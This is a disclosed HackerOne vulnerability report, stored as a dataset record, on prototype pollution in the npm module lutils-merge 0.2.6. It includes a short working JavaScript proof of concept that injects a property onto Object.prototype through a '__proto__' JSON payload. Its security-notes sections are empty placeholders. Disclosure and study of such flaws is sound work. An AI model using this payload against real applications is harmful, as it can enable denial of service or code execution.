---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '439107'
original_report_id: '439107'
title: Prototype pollution attack (lutils-merge)
weakness: Uncontrolled Resource Consumption
team_handle: nodejs-ecosystem
created_at: '2018-11-11T14:18:51.548Z'
disclosed_at: '2018-12-17T13:15:14.605Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 6
asset_identifier: Other module
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- uncontrolled-resource-consumption
---

# Prototype pollution attack (lutils-merge)

## Metadata

- HackerOne Report ID: 439107
- Weakness: Uncontrolled Resource Consumption
- Program: nodejs-ecosystem
- Disclosed At: 2018-12-17T13:15:14.605Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi team,
I would like to report a prototype pollution vulnerability in lutils-merge
that allows an attacker to inject properties on Object.prototype.

# Module

**module name:** lutils-merge
**version:** 0.2.6
**npm page:** `https://www.npmjs.com/package/lutils-merge`

## Module Description

> Merge javascript objects recursively.

## Module Stats
79 downloads in the last week

# Vulnerability

## Vulnerability Description

> this vulnerability type is similar to my report #438274
lutils-merge is vulnerable to prototype pollution when it performs a recursive copy of the specified objects.

## Steps To Reproduce:

> In the following code snippet, "payload" would come from user-input (JSON data).
```javascript
var merge = require('lutils-merge');
var payload = '{"__proto__":{"polluted":"merge_done !"}}';
var test = {};
console.log("Before: ", test.polluted);
merge({},JSON.parse(payload));
console.log("After: ", test.polluted);

# Wrap up

- I contacted the maintainer to let them know: N 
- I opened an issue in the related repository: N 

Thanks!

## Impact

It causes Denial of Service or RCE in some cases.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
